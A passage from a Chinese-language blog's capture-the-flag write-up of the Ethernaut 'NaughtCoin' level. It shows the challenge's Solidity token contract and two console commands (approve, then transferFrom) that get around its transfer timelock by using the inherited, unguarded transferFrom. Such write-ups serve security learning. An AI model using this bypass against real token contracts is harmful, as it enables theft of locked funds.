spend the funds.</span></span><br><span class="line"><span class="comment">   * @param _addedValue The amount of tokens to increase the allowance by.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这里我们可以看到transcationFrom()方法并没有被重写，因此我们可以直接调用，但是需要授权。</p>
<p>&emsp;&emsp;接下来看一下题目代码：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'zeppelin-solidity/contracts/token/ERC20/StandardToken.sol'</span>;</span><br><span class="line"></span><br><span class="line"> contract NaughtCoin is StandardToken &#123;</span><br><span class="line"></span><br><span class="line">  string public constant name = <span class="string">'NaughtCoin'</span>;</span><br><span class="line">  string public constant symbol = <span class="string">'0x0'</span>;</span><br><span class="line">  uint public constant decimals = <span class="number">18</span>;</span><br><span class="line">  uint public timeLock = now + <span class="number">10</span> years;</span><br><span class="line">  uint public INITIAL_SUPPLY = <span class="number">1000000</span> * (<span class="number">10</span> ** decimals);</span><br><span class="line">  address public player;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">NaughtCoin</span>(<span class="params">address _player</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    player = _player;</span><br><span class="line">    totalSupply_ = INITIAL_SUPPLY;</span><br><span class="line">    balances[player] = INITIAL_SUPPLY;</span><br><span class="line">    Transfer(<span class="number">0x0</span>, player, INITIAL_SUPPLY);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint256 _value</span>) <span class="title">lockTokens</span> <span class="title">public</span> <span class="title">returns</span>(<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.transfer(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Prevent the initial owner from transferring tokens until the timelock has passed</span></span><br><span class="line">  modifier lockTokens() &#123;</span><br><span class="line">    <span class="keyword">if</span> (msg.sender == player) &#123;</span><br><span class="line">      <span class="built_in">require</span>(now &gt; timeLock);</span><br><span class="line">      _;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这里我们可以看到合约只重写了transfer()函数，这里的balances并不是Ether，而是一种token，因此我们只需要给自己授权，然后吧token转给一个账户就行了。  </p>
<blockquote>
<p>await contract.approve(player,1000000<em>(10</em>18))<br>await contract.transferFrom(player,instance,1000000*(10**18));  </p>
</blockquote>
<p>&emsp;&emsp;这样以来我们就吧token全部转出了。  </p>
<hr>

        
      
    
    </div>
    
  </article>
  
  
    
  

  
</section>

  
  <nav class="pagination">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next ></a>
  </nav>


        </div>
      </main>

      <footer class="footer syuanpi fadeIn" id="footer">
  <hr>
  <div class="footer-wrapper">
    <div class="left">
      <div class="contact-icon">
    
    
    
    
    
    
    
    
    
        
        
        
        
        
            <a href="https://www.facebook.com/dong.yifan.1" class="iconfont icon-social-facebook" title="facebook"></a>
        
        
        
        
    
        
        
        
            <a href="https://twitter.com/dong_yifan" class="iconfont icon-social-twitter" title="twitter"></a>
        
        
        
        
        
        
    
        
        
        
        
            <a href="https://www.zhihu.com/people/aurora-56-20/activities" class="iconfont icon-zhihu" title="zhihu"></a>
        
        
        
        
        
    
        
            <a href="https://github.com/Explainaur" class="iconfont icon-social-github" title="github"></a>
        
        
        
        
        
        
        
        
    
</div>

    </div>
    <div class="right">
      <div class="copyright">
    <div class="info">
        <span>&copy;</span>
        <span>2016 ~ 2020</span>
        <span>❤</span>
        <span>dyf</span>
    </div>
    <div class="theme">
        <span>
            Powered by
            <a href="http://hexo.io/" target="_blank">Hexo </a>
        </span>
        <span>
            Theme
            <a href="https://github.com/ColMugX/hexo-theme-Nlvi"> Nlvi </a>
        </span>
    </div>
    
</div>

    </div>
  </div>
</footer>
    </div>
  </div>
  <script src="/script/lib/jquery/jquery-3.2.1.min.js"></script>


  <script src="/script/lib/lightbox/js/lightbox.min.js"></script>








<script src="/script/src/nlvi.js"></script>

  <script src="/script/scheme/banderole.js"></script>

<script src="/script/bootstarp.js"></script>


<div class="backtop syuanpi melt toTop" id="backtop">
    <i class="iconfont icon-up"></i>
    <span style="text-align:center;font-family:Georgia;"><span style="font-family:Georgia;" id="scrollpercent">1</span>%</span>
</div>


  <div class="search" id="search">
    <div class="mask" id="mask"></div>
    <div class="search-wrapper syuanpi">
      <h2 id="search-header" class="syuanpi">Search？</h2>
      <div class="input">
        <input type="text" id="local-search-input" results="0" name>
      </div>
      <div id="local-search-result"></div>
    </div>
  </div>


</body>
</html>
